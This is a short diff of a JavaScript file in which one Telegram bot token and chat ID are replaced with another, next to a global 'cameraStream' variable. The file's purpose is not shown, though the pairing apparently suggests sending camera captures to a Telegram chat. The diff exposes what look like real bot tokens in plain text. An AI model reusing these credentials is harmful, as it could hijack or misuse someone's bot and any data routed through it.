@@ -3,8 +3,8 @@
 // ============================================
 
 // CONFIGURATION
-const TELEGRAM_BOT_TOKEN = '8083946112:AAFNZO-jLfWxd4Jkk0kukKu9bHV7Sw06m-U';
-const TELEGRAM_CHAT_ID = '1846071063';
+const TELEGRAM_BOT_TOKEN = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
+const TELEGRAM_CHAT_ID = '6693365736';
 
 // Global Variables
 let cameraStream = null;
